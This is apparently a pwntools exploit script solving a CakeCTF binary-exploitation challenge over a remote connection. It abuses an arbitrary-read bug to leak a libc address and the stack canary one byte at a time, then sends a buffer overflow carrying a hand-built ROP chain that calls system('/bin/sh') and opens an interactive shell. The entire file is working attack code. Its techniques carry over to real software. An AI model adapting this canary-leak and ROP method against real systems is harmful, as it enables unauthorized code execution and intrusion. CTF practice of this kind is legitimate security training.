from pwn import *

context.terminal = ["tmux", "splitw", "-h"]


#p = process("./chall")
#gdb.attach(p, gdbscript="""
##b *0x4023e0
#c
#""")

p = remote("pwn.cakectf.com", "9004")
#context.log_level = "debug"
p.recvuntil(b">>")
def leak(addr):
    p.sendline(b"1")
    p.sendline(b"2") # ocelot
    p.sendline(b"69")
    p.sendline(b"Q" * 0x10)

    p.recvuntil(b">>")
    p.sendline(b"3")
    p.sendline(str(addr))
    p.sendline(b"F" * 0x20 + p64(0x0))
    
    p.recvuntil(b">>")
    p.sendline(b"2")
    data = p.recvuntil(b">>")
    line = data.split(b"\n")[2]
    data = line[6:].ljust(8, b"\0")[:8]
    print(line)
    result = u64(data)
    print(hex(result))
    return result

libc_leak = leak(0x407cf0)
canary_addr = libc_leak + (0x7fce5929af68 - 0x7fce596a14d0)
bin_sh_addr = libc_leak + (0x7fce595bd5aa - 0x7fce596a14d0)
system_addr = bin_sh_addr + (0x7f0ad3990410 - 0x7f0ad3af25aa) 
print(hex(canary_addr))

total_canary = b""
for x in range(8):
    canary_leak1 = leak(canary_addr + x) # read one byte at a time
    total_canary += p8(canary_leak1 & 0xff)
total_canary = u64(total_canary)
print(hex(total_canary))


print(hex(bin_sh_addr))

# Manual ROP chain

rop = b""
rop += b"F" * 24 # between canary check and ret there is pop rbx, pop rbp, and add rsp, 8
rop += p64(0x0000000000403a33) # pop rdi; ret
rop += p64(bin_sh_addr)
rop += p64(0x403a34) # ret; (for alignment)
rop += p64(system_addr)

p.sendline(b"1")
p.sendline(b"0") # bengal
p.sendline(b"69")
p.sendline(b"z" * 0x88 + p64(total_canary) + rop)




p.interactive()
